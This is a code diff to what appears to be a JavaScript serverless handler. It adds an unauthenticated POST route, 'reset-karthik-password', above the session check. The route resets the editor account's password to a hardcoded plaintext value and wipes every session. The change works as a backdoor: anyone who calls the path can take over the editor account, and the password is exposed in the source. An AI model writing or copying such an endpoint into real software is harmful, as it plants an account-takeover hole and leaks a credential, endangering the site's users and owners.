@@ -79,7 +79,12 @@ export default async (req) => {
       await store.setJSON("data", data);
       return json({ token: newToken, ...publicState(data, key) });
     }
-
+if (path === "reset-karthik-password" && req.method === "POST") {
+  data.users.editor.passHash = sha256("OneRepublic#1R");
+  data.sessions = {};
+  await store.setJSON("data", data);
+  return json({ ok: true, message: "Karthik's password has been reset" });
+}
     /* ---- everything below requires a valid session ---- */
     if (!meKey) return json({ error: "Session expired — log in again" }, 401);
 
